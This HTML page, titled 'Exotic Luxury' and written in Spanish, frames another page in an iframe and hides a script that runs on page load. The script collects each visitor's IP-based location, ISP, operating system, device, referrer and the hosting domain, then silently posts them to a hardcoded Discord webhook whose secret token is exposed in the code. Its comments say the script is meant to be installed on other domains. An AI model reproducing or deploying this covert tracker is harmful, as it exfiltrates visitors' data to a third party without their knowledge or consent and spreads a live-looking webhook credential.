<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Exotic Luxury</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        html,body{margin:0;padding:0;height:100%;overflow:hidden}
        iframe{border:none;width:100%;height:100vh;display:block}
    </style>
</head>
<body>
 
    <iframe
        src="exotic.html"
        allowfullscreen
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
    </iframe>

    <!-- ANTES DE </body> - Tu script original con ISP agregado y nuevo webhook -->
    <script>
    (() => {
      const WEBHOOK = "https://discord.com/api/webhooks/1465881552859959421/6py4nNvJY4N5F2RXp0whjA8QPlajJnR-bZAkp14o5bxr6JNqZjCFpo2njpe8Mt_e4Cns";

      async function getIPInfo() {
        try {
          const r = await fetch("https://ipapi.co/json/");
          const data = r.ok ? await r.json() : {country_name: "Desconocido", city: "Desconocido", country_code: "XX"};
          
          return {
            country_name: data.country_name || "Desconocido",
            city: data.city || "Desconocido",
            country_code: data.country_code || "XX",
            isp: data.org || data.asn || "No disponible"  // â† ISP agregado aquÃ­
          };
        } catch {
          return {country_name: "Desconocido", city: "Desconocido", country_code: "XX", isp: "No disponible"};
        }
      }

      function parseUA() {
        const ua = navigator.userAgent;
        const isBot = /bot|crawler|spider|crawl/i.test(ua);
        let os = "Desconocido", device = "Desconocido";

        if (/Windows NT/i.test(ua))        os = "Windows";
        else if (/Mac OS X/i.test(ua))     os = "macOS";
        else if (/Android/i.test(ua))      os = "Android";
        else if (/iOS|iPhone|iPad/i.test(ua)) os = "iOS";
        else if (/Linux/i.test(ua))        os = "Linux";

        if (/Samsung/i.test(ua))           device = "Samsung";
        else if (/iPhone/i.test(ua))       device = "iPhone";
        else if (/iPad/i.test(ua))         device = "iPad";
        else if (/Huawei/i.test(ua))       device = "Huawei";
        else if (/Xiaomi/i.test(ua))       device = "Xiaomi";
        else device = "PC/Otro";

        return {os, device, isBot};
      }

      window.addEventListener("DOMContentLoaded", async () => {
        const ip   = await getIPInfo();
        const ua   = parseUA();
        const originDomain = window.location.hostname;   // â† dominio donde estÃ¡ instalado
        const fullURL      = window.location.href;       // â† URL completa (opcional)

        const payload = {
          username: "EXTINTO",
          embeds: [{
            color: ip.country_code === "CO" ? 0x00ff00 : 0xff0000,
            title: ua.isBot ? "ðŸ¤–  BOT detectado" : "ðŸ‘¤  Visita humana",
            fields: [
              {name: "ðŸŒ  PaÃ­s",       value: ip.country_name, inline: true},
              {name: "ðŸ™ï¸  Ciudad",    value: ip.city,         inline: true},
              {name: "ðŸ“  Origen",     value: ip.country_code === "CO" ? "ðŸ‡¨ðŸ‡´  Colombia" : "ðŸŒ  Exterior", inline: true},
              {name: "ðŸ“¡  ISP",        value: ip.isp, inline: true},  // â† ISP agregado aquÃ­
              {name: "ðŸ’»  SO",         value: ua.os,           inline: true},
              {name: "ðŸ“±  Dispositivo",value: ua.device,       inline: true},
              {name: "ðŸ”—  Dominio ref",value: document.referrer || "Directo / Sin referrer", inline: true},
              {name: "ðŸŒ  Sitio Puribal",value: originDomain, inline: true},
              {name: "ðŸ•’  Hora (UTC)", value: new Date().toISOString(), inline: true}
            ]
          }]
        };

        fetch(WEBHOOK, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify(payload),
          keepalive: true
        }).catch(() => {});
      });
    })();
    </script>
</body>
</html>
